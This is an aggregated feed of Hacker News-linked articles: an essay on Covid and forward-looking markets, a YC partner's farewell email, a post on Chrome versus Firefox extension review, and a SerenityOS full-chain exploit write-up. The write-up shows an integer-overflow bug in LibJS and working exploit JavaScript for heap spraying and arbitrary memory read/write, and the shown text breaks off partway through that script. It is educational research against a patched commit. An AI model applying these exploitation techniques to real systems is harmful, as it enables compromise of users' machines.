Score 119 | Comments 69 (<a href="https://news.ycombinator.com/item?id=26116488">thread link</a>) | @furtively
<br/>
February 12, 2021 | https://worksinprogress.co/issue/how-covid-brought-the-future-back/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/how-covid-brought-the-future-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>When the US joined World War Two, it set back a number of peacetime R&amp;D projects. A team at Bell Labs had been studying some interesting properties of semiconducting substances, with the hope that they might find a way to replace the then-ubiquitous vacuum tube. But the exigencies of wartime complicated their plans‚Äîfor one thing, the only supplier of sufficiently pure silicon was a German company‚Äîso they took a break to focus on wartime applications like radar. By the time they returned to regular work, the war was won, the US industrial base had dramatically ramped up (now DuPont, not German suppliers, made the world‚Äôs purest silicon), and the team had acquired an encyclopedic knowledge of how substances like silicon and germanium behave.</p>
<p>Two years later, the transistor was born.</p>
<p>Crises radically reshape priorities; they cancel some projects, and accelerate others. But another effect they have is to make people more conscious of the future. To struggle through a crisis is, implicitly, to view the future as a point very much worth getting to. The Bell Labs team certainly helped build a better postwar future, and arguably Covid-19 has pushed people in the same direction.</p>
<p>We shouldn‚Äôt expect the results of this to be visible just yet. Scientific progress is visible on a lag: while the <i>New York Times</i> did mention the invention of transistors, it was midway through a column called ‚Äúnews of the radio,‚Äù hardly an accurate assessment of the impact of one of the twentieth century‚Äôs great inventions. Fortunately, there are more real-time ways to approximate people‚Äôs attitudes towards the future‚Äîthe stock market is a real-time dollar-weighted poll about what kinds of companies will matter, and how that‚Äôs changing.</p>
<p>One of the surprising consequences of the Covid-19 pandemic was that, after a brief and fearsome decline, overall asset prices rose. That‚Äôs partly an artifact of how policymakers responded to the pandemic; pumping liquidity into the market does help offset supply shocks, and some of that money finds its way into speculative vehicles. But even <i>within</i> the market, there‚Äôs been a striking rise in investor interest in electric vehicles, autonomous cars, AI, and software companies ranging from consumer-facing companies like Facebook and Google to complex enterprise products like Snowflake.</p>
<p>The market‚Äôs judgments always have to be taken judiciously. Humans are imperfect judges of the present, not to mention the future. And as the recent GameStop fireworks demonstrate, sometimes prices can be driven more by technical aspects of market structure than by a cold and calculating assessment of the net present value of future cash flows. Even GameStop‚Äôs run-up, though, was born out of forward-looking analysis of a business, not gambling. The original thesis behind buying GameStop, before it turned into a social movement devoted to punishing hedge funds, <i>was</i> an argument that the company was fundamentally underpriced‚Äîbecause the market had missed its opportunity to transcend brick-and-mortar retailing and digitize its business!</p>
<p>There are definite precedents for extrapolating about new concerns from stock prices. Defense stocks rise when war is rumored to be imminent, for example, and cyclical stocks‚Äô performance tends to change ahead of macro data on the economic cycle. More narrowly, the economist Armen Alchian <a href="https://www.sciencedirect.com/science/article/abs/pii/S0929119914000546">deduced that hydrogen bombs use lithium by tracking the stock prices of mining companies</a>.</p>
<p>Today, the world‚Äôs most valuable automaker is Tesla, with a market capitalization of $827bn, compared to $232bn for runner-up Toyota. Tesla isn‚Äôt valued based on its current production (just under 500,000 vehicles annually, compared to Toyota‚Äôs 9.2 million) or high margins (it eked out a net profit margin of just under 2%, less than half of Toyota‚Äôs results). Instead, Tesla is valued based on three forward-looking intangibles: it‚Äôs a pure-play electric vehicle company, its brand name is synonymous with clean energy rather than the more mixed reaction General Motors or Hyundai might engender, and its charismatic CEO has been able to recruit cult-like adherents to his vision of sustainable transportation and a multiplanetary species.</p>
<p>Calling Tesla is a cult isn‚Äôt pejorative, just descriptive: any organization that successfully accomplishes something that is widely believed to be impossible has to have distinctive beliefs, and any group of people who behave in unusual ways because of shared beliefs can be reasonably described as a cult. Some companies use their cultish aspects in harmful ways, but cults are a social design pattern that shows up over and over again, in successful companies and political movements. Cult-like traits are more common with companies that are growing fast‚Äîit would be hard for a steel mill or a local bank to engender this kind of behavior in its employees. It‚Äôs a way to focus everyone‚Äôs energy on the future, and avoid distracting questions about whether or not that future is viable‚Äîa way to raise the variance of outcomes, which makes extreme upside scenarios possible while increasing the odds of failure.</p>
<p>Tesla is not the only futuristic vehicle stock to be accorded a high value by the stock market. In fact, it‚Äôs arguably among the more mature. There are at least earnings to put a price/earnings multiple on, whereas many of the more recent EV companies are at an earlier stage than that. Luminar Technologies, for example, went public through a reverse merger late last year, and currently has a market value of almost $11bn. The company has minimal sales ($11m over the last nine months) and is still pouring money into R&amp;D. But LiDAR appears to be the most promising way to get cars to full autonomy, so investors are willing to value it based on the chance that a) autonomous vehicles will happen, b) they‚Äôll use LiDAR, c) they‚Äôll use Luminar‚Äôs systems to do it, and d) Luminar will be able to earn acceptable margins selling it.</p>
<p>The joint probability of all of those possibilities is low if they‚Äôre independent: if there‚Äôs a 10% chance of autonomous vehicles, a 10% chance they‚Äôll use LiDAR, a 10% chance that LiDAR-using AVs will use Luminar‚Äôs technology, and a 10% chance that Luminar will get good margins, then the odds of Luminar being a good investment work out to 0.01%. But the more ambitious a company is, the more its job is to make those variables <i>conditional</i> instead: the closer a company gets to being the <i>only</i> way a given technology can happen, the more technology risk becomes synonymous with business risk, which compresses the overall range of outcomes. It also solves for the viable-business condition: if there‚Äôs just one company that can make AVs possible, then that company will have the pricing power necessary to make them profitable, too.</p>
<p>This dynamic actually works in two directions: first, it means that the odds of Luminar selling LiDAR conditional on LiDAR becoming ubiquitous are higher, because the latter is most probably going to happen if the former is true. And second, it‚Äôs a recruiting tool: if there‚Äôs one company that has a reasonable shot at accomplishing something, and it‚Äôs a desirable goal, then the company has a monopoly on the kinds of employees who can achieve that goal. This is a point Peter Thiel articulates in <i>Zero to One</i>, and it‚Äôs one of the reasons technology companies have such a skewed distribution of outcomes. They articulate a variant view, which means they attract people who share that variant view‚Äîand since the argument is settled by technology and economics, they don‚Äôt have to persuade the rest of the world, just to offer a better product.</p>
<p>The rise of special purpose acquisition vehicles, or SPACs, is a general testament to a more forward-looking market. In a conventional IPO, an operating company sells shares to the public; with a SPAC, an empty shell company goes public, and then identifies a private company to merge with. Due to a quirk in securities laws, a traditional IPO prospectus only shows a company‚Äôs backwards-looking estimates, and makes heavily-qualified statements about the future. A company that goes public through a SPAC is technically engaging in a merger, rather than an IPO, and the rules are different. When a public company buys another company, securities laws allow it to talk about that company‚Äôs anticipated growth, or the likely cost savings of the merger. Similarly, SPAC offerings can talk up a company‚Äôs long-term prospects, and even make exact estimates of future revenue.</p>
<p>SPACs have existed for years, but they exploded in popularity in 2020. Of the 466 SPAC companies that went public from 2011 through 2020, 248 of them went public in 2020 alone. A number of technical forces drove this‚Äîa large number of private companies looking for acquisitions, investors eager to get into <i>any</i> growth company early, some technicalities around SPAC issuance that make them attractive to specialist hedge funds. But the key driver of excitement about SPACs is that they can take companies public based on a future-focused outlook.</p>
<p>When Virgin Galactic went public by merging with Chamath Palihapitiya‚Äôs Social Capital Hedosophia Holdings, the company, which has taken deposits but generated minimal revenue, was able to project $590 million in annual revenue in the year 2023, and over a quarter of a billion dollars in pretax, pre-depreciation earnings. While this was optimistic, it‚Äôs also demonstrative: a company like Virgin Galactic would have been almost impossible to take public in a conventional way, because backwards-looking financial statements showed only losses. it may not work out as a business, or live up to its projections, but those projections got more plausible once it had access to public markets for funding.</p>
<p>High valuations for money-losing, often pre-revenue companies remind people of the dot-com bubble, and it‚Äôs worth putting that bubble in perspective. Someone who bought the market at its peak in March 2000 has earned a 6% compounded return since then. ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/how-covid-brought-the-future-back/">https://worksinprogress.co/issue/how-covid-brought-the-future-back/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/how-covid-brought-the-future-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116488</guid>
            <pubDate>Fri, 12 Feb 2021 17:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye YC]]>
            </title>
            <description>
<![CDATA[
Score 277 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26116420">thread link</a>) | @awaxman11
<br/>
February 12, 2021 | https://blog.aaronkharris.com/goodbye-yc | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/goodbye-yc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p><i>I sent this email to the whole team at YC yesterday:</i></p><p>When I joined&nbsp;YC&nbsp;7.5 years ago, there weren‚Äôt many people around. PG and Jessica were still running things. We had offices in Mountain View, Palo Alto, and on Kearny street, but they were nearly always empty. The only meeting on any calendar was the lunch on Thursdays where we‚Äôd talk about companies over takeout or at a table in a crowded restaurant.</p><p>The ways in which we‚Äôve changed since then have been amazing to see.&nbsp;YC&nbsp;has grown in every way imaginable. The scope of what&nbsp;YC&nbsp;funds is larger. The team is bigger and more capable. The number of companies is pushing towards some ever receding upper bound. There‚Äôs more software, a larger community, and more programming designed to help&nbsp;YC&nbsp;founders build better futures.</p><p>I feel a deep sense of pride and honor at the part that I‚Äôve played in that change and growth. I recall the first conversation I had with Aaron King about the Series A for Snapdocs. The questions he and I worked through were the kernel of the Series A program. I am amazed to see the directions in which Janelle is now building YCA. I‚Äôm grateful for the part I played in our conversations about growing beyond seed investing - conversations which eventually took shape as YCC. And, of course, there are fifteen batches worth of applications, interviews, dinners, office hours, and demo days rattling around in my head.<br></p><p>I‚Äôve been thinking, recently, about the founders with whom I‚Äôve had a chance to work. I‚Äôve lost count of the number of incredible people I‚Äôve gotten to know over these last years. Thinking back, it‚Äôs easy to see how the sheer weight of numbers can drive a person to be jaded about the problems that founders face. But the other night, as I spoke with a founder about a tough situation, I was reminded about how important it is to that individual that she gets the best possible advice. This is a lesson I learned time and again, and is something I hope I‚Äôll never forget.</p><p>And then there‚Äôs the funny stuff. There were stolen air conditioners, barefoot pitches, robots that did not make sandwiches, update emails pulled from the I Ching, bandages, inhaled jet fuel, and literal blood on the interview floors. These are the things that I‚Äôll remember long after everything else.</p><p>The truth is, I only meant to stick around&nbsp;YC&nbsp;for two years. Somehow, that two became two more, and then some more. As meaningfully as I‚Äôve enjoyed my work here, it‚Äôs time for me to move onto something different and new and outside the bounds of what&nbsp;YC&nbsp;does. That‚Äôs a strange, exhilarating moment, and an important one for me and for my family. The pandemic provided the practical and existential nudge I needed to see the depth of this need.</p><p>To my fellow partners - thank you for your tireless work for our founders and for&nbsp;YC. Thank you for everything you‚Äôve taught me, for all the strange conversations we‚Äôve had, and for all the demo day presentations we‚Äôve crafted.</p><p>To PG and Jessica and Trevor and RTM - thank you for giving me this opportunity and for making&nbsp;YC&nbsp;the kind of place I could love enough to stay long after I meant to leave.</p><p>To Janelle - thank you for building YCA with me and for being the best person I could imagine to take it into the future.</p><p>To everyone else -&nbsp;YC‚Äôs mission in the world is abstract. It could mean so many things, but it wouldn‚Äôt be anything without your work. Whether you are managing founder expectations about housing in the Bay Area, helping someone understand the mysteries of cap tables, talking someone down off the ledge of yelling at a reporter, or making sure that there will one day be an office to come back to, you are what makes&nbsp;YC&nbsp;a viable, vital force in the world.</p><p>I‚Äôve never liked&nbsp;goodbye.</p><p>aaron</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/goodbye-yc</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116420</guid>
            <pubDate>Fri, 12 Feb 2021 17:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's time to port your extension to Firefox]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 34 (<a href="https://news.ycombinator.com/item?id=26116105">thread link</a>) | @DanielDe
<br/>
February 12, 2021 | https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox | <a href="https://web.archive.org/web/*/https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
        <h4>February 12th, 2021 ¬∑ 5 minute read</h4>

        <p>
          I've seen quite a <a href="https://news.ycombinator.com/item?id=21990566">few</a> <a href="https://blog.pushbullet.com/2020/05/13/lets-guess-what-google-requires-in-14-days-or-they-kill-our-extension/">people</a> <a href="https://blog.lipsurf.com/part-ii-after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why/">complaining</a> lately about the Kafkaesque Chrome extension review process, so when I started running into my own problems with the Chrome Web Store I wasn't exactly surprised.
        </p>

        <p>
          It wasn‚Äôt until I submitted the same extension to the Firefox Add-Ons Store that I saw just how good things could be. In a world of walled gardens watched over by heavy handed reviewers, Firefox's review process was laughably good.
        </p>

        <section>
          

          <p>
            In January 2020 my buddy and I started working on an idea we had for an automation app. We called it Otto.
          </p>

          <p>
            Otto consisted of two parts: a Mac app and a browser extension. After a few months worth of nights and weekends we had an alpha version we were ready to share with friends. I submitted the browser extension to Chrome under my own personal account, and after a review process of a couple days it was accepted. So far so good.
          </p>
        </section>

        <section>
          

          <p>
            The trouble started a few months later. After some more development and discussion, we re-framed our idea as an app to make custom keyboard shortcuts and we decided to rename Otto to <a href="https://keysmith.app/">Keysmith</a>. We also took the time at this point to create a company Google account. We renamed the extension and submitted it from our new company account.
          </p>

          <p>
            To be clear: changing the name was the <i>only</i> change we made.
          </p>

          <p>
            A few days later we received a rejection email. Here's a timeline of our interaction:
          </p>

          <div>
            
            <p>
                We submit Keysmith to the Chrome Web Store.
              </p>
          </div>

          <div>
            
            <div>
              <p>
                First rejection email.

                Quick summary:
              </p>

              <ul>
                <li>Keysmith "violates the 'Use of Permissions' section"</li>
                <li>We should "Request access to the narrowest permissions necessary"</li>
                <li>"If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality."</li>
                <li>We shouldn't attempt to "future proof"</li>
              </ul>
            </div>
          </div>

          <div>
            
            <div>
              <div><p>
                We double check the permissions we've requested and can't find any problems. We respond asking for more detail.
                </p><p>
                We also mention that we had previously submitted the <i>same</i> extension with the <i>same</i> requested permissions, just under a different name (Otto). We hoped they'd say "oh, in that case we'll approve this right away!". But instead:
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                Otto, our <i>existing extension</i>, is removed from the store and no additional detail on the rejection is provided. In fact, this email contains the <i>same exact</i> text as the previous one.
              </p>
          </div>

          <div>
            
            <p>
                We respond, again asking for more detail. We ask if it would help if we expanded on how we're using each permission in the permissions justification section.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the <i>exact same text again</i>. No further detail. No help at all.
              </p>
          </div>

          <div>
            
            <p>
                We suspect these reviews are entirely automated, so we ask if we can speak to a "human reviewer", hoping this will trigger a manual review (we also consider dropping an f-bomb for the same reason, but decide to remain decent for now).
              </p>
          </div>

          <div>
            
            <p>
                They respond with some <i>slightly</i> different text, but still nothing useful.
              </p>
          </div>

          <div>
            
            <p>
                We try adding a lot more detail to the "justification" section for each of the permissions we use and we resubmit.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the exact same text as the first rejection.
              </p>
          </div>

          <div>
            
            <p>
                We respond with one more plea for more more information.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the same text again.
              </p>
          </div>
        </section>

        <section>
          

          <p>
            At this point I dig into Chrome's documentation once again with a fine-tooth comb and I make a discovery: we had been requesting both the <span>tabs</span> and <span>activeTab</span> permissions, but since we also requested permission to run on <span>&lt;all_urls&gt;</span> it turns out that the features made available by <span>activeTab</span> were a strict subset of the features made available by <span>tabs</span>. So the <span>activeTab</span> permission was redundant. We weren't opening up any new functionality, we were just asking for a <i>redundant</i> permission.
          </p>

          <p>
            This discovery made the Chrome review team's communications far more frustrating in retrospect. The line that all of their emails repeated was "Request access to the narrowest permissions necessary". And, sure, we had asked for <span>activeTab</span> when we didn't need it, but that permission <i>didn't grant us any more functionality</i>. They had rejected our extension 6 times with no detail <i>because of a technicality</i>.
          </p>

          <p>
            We committed the 1 line diff removing the <span>activeTab</span> permission and resubmitted. A day later it was accepted.
          </p>
        </section>

        <section>
          

          <p>
            A Firefox version of our browser extension had long been on our list, but for the first little while it didn't feel worth the additional support cost. We didn't know exactly how large that cost would be, but we suspected that there would be enough differences between the two browsers that it'd be a bit of a hassle to maintain them both.
          </p>

          <p>
            Boy were we wrong. When we finally started looking into porting our extension to Firefox we found that we had to make <i>zero</i> changes to the code. None whatsoever. Firefox even supported the use of the global <span>chrome</span> object for accessing extension APIs (if you're curious, Chrome is not kind enough to return the favor).
          </p>

          <p>
            So we created a Firefox developer account, submitted our extension, and girded ourselves for another rough ride.
          </p>

          <p>
            <i>Boy were we wrong.</i>
          </p>

          <div>
            
            <p>
                We submit the first version of our extension to Firefox.
              </p>
          </div>

          <div>
            
            <div>
              <div><p>
                Less than 3 hours later we receive an email from Firefox that says, in effect, "Sorry this is taking so long, but we'll get to it soon!"
                </p><p>
                Responses from the Chrome team usually came in the wee hours of the morning, making the effective turnaround about 24 hours. Firefox apologizing after fewer than 3 hours was <i>hilarious</i> to us.
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                We get an email saying the extension was accepted exactly 24 hours after submission.
              </p>
          </div>

          <p>
            Further updates have been even speedier, usually only taking 2 or 3 minutes to be scanned and accepted. One of our updates even got accepted before I finished uploading the unminified source archive (which they require if you minify in production). And the dashboard shows your position in the review queue to give you some idea of when it'll complete.
          </p>

          <p>
            Needless to say, this was a breath of fresh air, and we won't be neglecting support for Firefox ever again in the future.
          </p>
        </section>

        <section>
          

          <p>
            I realize that in some ways this is an unfair comparison. Chrome's market share is much larger than Firefox's these days, so surely they also have to deal with far more extension submissions.
          </p>

          <p>
            But the lack of transparency in their process was infuriating and counter-productive. Had someone taken the time to manually review our case, or at least <i>read any of the emails</i> we sent, we could've resolved this issue with one response. Instead it took 6 responses and a week of wondering if this review process would kill our product before it even launched.
          </p>

          <p>
            I really hope things improve, but I'm not counting on it.
          </p>

        </section>

        <hr>

        
      </div>
    </div></div>]]>
            </description>
            <link>https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116105</guid>
            <pubDate>Fri, 12 Feb 2021 17:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ghost in the MP3 (2014)]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 64 (<a href="https://news.ycombinator.com/item?id=26116062">thread link</a>) | @Tomte
<br/>
February 12, 2021 | http://theghostinthemp3.com/theghostinthemp3.html | <a href="https://web.archive.org/web/*/http://theghostinthemp3.com/theghostinthemp3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://theghostinthemp3.com/theghostinthemp3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116062</guid>
            <pubDate>Fri, 12 Feb 2021 17:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Writing a Full Chain Exploit]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26115141">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>I recently came across <a href="https://github.com/SerenityOS/serenity">SerenityOS</a> when it was featured in hxp CTF and then on <a href="https://twitter.com/liveoverflow">LiveOverflow‚Äôs</a> YouTube channel. SerenityOS is an open source operating system written from scratch by <a href="https://twitter.com/awesomekling">Andreas Kling</a> and now has a strong and active community behind it. If you‚Äôd like to learn a bit more about it then the recent <a href="https://cppcast.com/serenity-os/">CppCast episode</a> is a good place to start, as well as all of the <a href="https://www.youtube.com/andreaskling">fantastic videos by Andreas Kling</a>.</p>

<p>Two of the recent videos were about writing exploits for a <a href="https://www.youtube.com/watch?v=LMvjaoBLPxA">typed array bug in javascript</a>, and a <a href="https://www.youtube.com/watch?v=gt6-TC6FtMs">kernel bug in munmap</a>. The videos were great to watch and got me thinking that it would be fun to try and find a couple of bugs that could be chained together to create a full chain exploit such as exploiting a browser bug to exploit a kernel bug to get root access.</p>

<h3 id="entrypoint">Entrypoint</h3>

<p>I started looking around and discovered an integer overflow when creating a typed array from an array buffer, the length was multiplied by the element size which could overflow.
<a href="https://github.com/SerenityOS/serenity/blob/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b/Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69">Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69</a></p>

<div><div><pre><code><span>static</span> <span>void</span> <span>initialize_typed_array_from_array_buffer</span><span>(</span><span>GlobalObject</span><span>&amp;</span> <span>global_object</span><span>,</span> <span>TypedArrayBase</span><span>&amp;</span> <span>typed_array</span><span>,</span> <span>ArrayBuffer</span><span>&amp;</span> <span>array_buffer</span><span>,</span> <span>Value</span> <span>byte_offset</span><span>,</span> <span>Value</span> <span>length</span><span>)</span>
<span>{</span>
    <span>// SNIP ...</span>

    <span>auto</span> <span>buffer_byte_length</span> <span>=</span> <span>array_buffer</span><span>.</span><span>byte_length</span><span>();</span>
    <span>size_t</span> <span>new_byte_length</span><span>;</span>
    <span>if</span> <span>(</span><span>length</span><span>.</span><span>is_undefined</span><span>())</span> <span>{</span>
        <span>if</span> <span>(</span><span>buffer_byte_length</span> <span>%</span> <span>element_size</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayInvalidBufferLength</span><span>,</span> <span>typed_array</span><span>.</span><span>class_name</span><span>(),</span> <span>element_size</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffset</span><span>,</span> <span>offset</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>new_byte_length</span> <span>=</span> <span>buffer_byte_length</span> <span>-</span> <span>offset</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>new_byte_length</span> <span>=</span> <span>new_length</span> <span>*</span> <span>element_size</span><span>;</span>
        <span>if</span> <span>(</span><span>offset</span> <span>+</span> <span>new_byte_length</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffsetOrLength</span><span>,</span> <span>offset</span><span>,</span> <span>offset</span> <span>+</span> <span>new_byte_length</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>typed_array</span><span>.</span><span>set_viewed_array_buffer</span><span>(</span><span>&amp;</span><span>array_buffer</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_length</span><span>(</span><span>new_byte_length</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_offset</span><span>(</span><span>offset</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_array_length</span><span>(</span><span>new_byte_length</span> <span>/</span> <span>element_size</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This could be used to create two powerful primitives, one that could read an arbitrary address and the other that could read an arbitrary amount from some allocated memory. These were the same primitives that Kling created in his video which meant that the issue could be exploited in exactly the same way:</p>

<ul>
  <li>Finding a vtable pointer with the offset primitive by spraying lots of Numbers</li>
  <li>Use the deterministic memory layout to calculating the stack location</li>
  <li>Find the saved return address on the stack</li>
  <li>Overwriting it with a rop chain.</li>
</ul>

<p>While I was looking into exploiting this, someone else spotted the same issue and it was quickly patched.</p>

<p><a href="https://github.com/SerenityOS/serenity/commit/f6c6047e49f1517778f5565681fb64750b14bf60"><img src="https://devcraft.io/assets/serenity/slack.jpg" alt="slack"></a></p>

<p>As I had already started and wanted to keep using the same issue, I kept working from <a href="https://github.com/SerenityOS/serenity/commit/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b">this commit</a> which still had the bug :)</p>

<p>Exploiting the issue is pretty much identical to the video above and it does a great job explaining what is going on, so I wont go into too much detail. Here Is what I ended up with:</p>

<div><div><pre><code><span>&lt;script&gt;</span>
  <span>function</span> <span>log</span><span>(</span><span>msg</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>msg</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>starting hax</span><span>"</span><span>);</span>

  <span>const</span> <span>AAAs</span> <span>=</span> <span>2261634.509804</span><span>;</span>
  <span>const</span> <span>spray_size</span> <span>=</span> <span>2000</span><span>;</span>
  <span>const</span> <span>spray</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>spray_size</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>// Create an array with a null backing store allowing arbitary rw</span>
  <span>ab1</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>();</span>
  <span>ua1</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab1</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>// Create an array with a large length but a valid backing store</span>
  <span>ab2</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>(</span><span>0x50000</span><span>);</span>
  <span>ua2</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab2</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>done spraying</span><span>"</span><span>);</span>

  <span>function</span> <span>read</span><span>(</span><span>addr</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write</span><span>(</span><span>addr</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>// 0x6c000 is the offset from the array buffer to the next heap allocation</span>
  <span>function</span> <span>read_heap</span><span>(</span><span>off</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write_heap</span><span>(</span><span>off</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>number_i</span> <span>=</span> <span>0</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>looking for 0x41414141</span><span>"</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>100</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read_heap</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>0x41414141</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read_heap</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>(</span><span>16</span><span>));</span>
      <span>number_i</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>number_i_vtable</span> <span>=</span> <span>number_i</span> <span>-</span> <span>8</span><span>;</span>

  <span>const</span> <span>libjs_data_addr</span> <span>=</span> <span>read_heap</span><span>(</span><span>number_i_vtable</span><span>)</span> <span>-</span> <span>0x28ac</span><span>;</span>
  <span>const</span> <span>libjs_addr</span> <span>=</span> <span>libjs_data_addr</span> <span>-</span> <span>0xe0000</span><span>;</span>
  <span>const</span> <span>stack_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x2537000</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>libjs_data_addr 0x</span><span>"</span> <span>+</span> <span>libjs_data_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
